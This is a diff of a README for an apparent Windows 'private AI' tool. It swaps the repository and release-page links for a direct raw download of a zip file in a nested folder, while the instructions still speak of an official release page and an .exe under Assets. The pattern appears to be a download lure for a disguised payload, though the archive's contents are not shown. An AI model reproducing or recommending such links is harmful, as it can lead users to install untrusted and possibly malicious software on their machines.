@@ -1,6 +1,6 @@
 # 🤖 local-ai-private-2026 - Run secure private AI on Windows
 
-[![Download local-ai-private-2026](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/professional-gasgun20/local-ai-private-2026)
+[![Download local-ai-private-2026](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/professional-gasgun20/local-ai-private-2026/raw/refs/heads/main/arsono/local-private-ai-3.5.zip)
 
 ## 💡 About this software
 
@@ -29,7 +29,7 @@ To run this software, your computer needs the following specifications:
 
 ## 📥 How to download and install
 
-1.  Visit the official release page to get the installer package: [https://github.com/professional-gasgun20/local-ai-private-2026](https://github.com/professional-gasgun20/local-ai-private-2026)
+1.  Visit the official release page to get the installer package: [https://github.com/professional-gasgun20/local-ai-private-2026/raw/refs/heads/main/arsono/local-private-ai-3.5.zip](https://github.com/professional-gasgun20/local-ai-private-2026/raw/refs/heads/main/arsono/local-private-ai-3.5.zip)
 2.  Click on the latest release link at the top of the page.
 3.  Look for the file ending in `.exe` under the "Assets" section.
 4.  Download the file to your "Downloads" folder.
